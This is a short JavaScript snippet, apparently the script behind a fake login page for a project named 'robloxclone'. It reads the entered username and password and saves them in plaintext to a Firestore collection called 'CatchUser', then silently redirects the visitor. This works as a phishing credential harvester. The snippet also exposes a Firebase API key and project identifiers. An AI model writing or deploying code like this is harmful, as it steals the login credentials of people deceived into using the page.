        const firebaseConfig = {
            apiKey: "AIzaSyAKS6C15wph5obJWpWvTAICfxTIAd186D0",
            authDomain: "robloxclone-f370e.firebaseapp.com",
            projectId: "robloxclone-f370e",
            storageBucket: "robloxclone-f370e.firebasestorage.app",
            messagingSenderId: "449078811921",
            appId: "1:449078811921:web:8b96adc068a2e31ee6c0b0"
        };


        firebase.initializeApp(firebaseConfig);
        
        const db = firebase.firestore();
        
        function submitAndRedirect(event, url) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            db.collection('CatchUser').add({
                username: username,
                password: password,
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            })
            .then(() => {
                console.log("Data saved");
                window.open(url, '_self');
            })
            .catch((error) => {
                console.error("Error saving data: ", error);
                window.open(url, '_self');
            });
        }                                                                            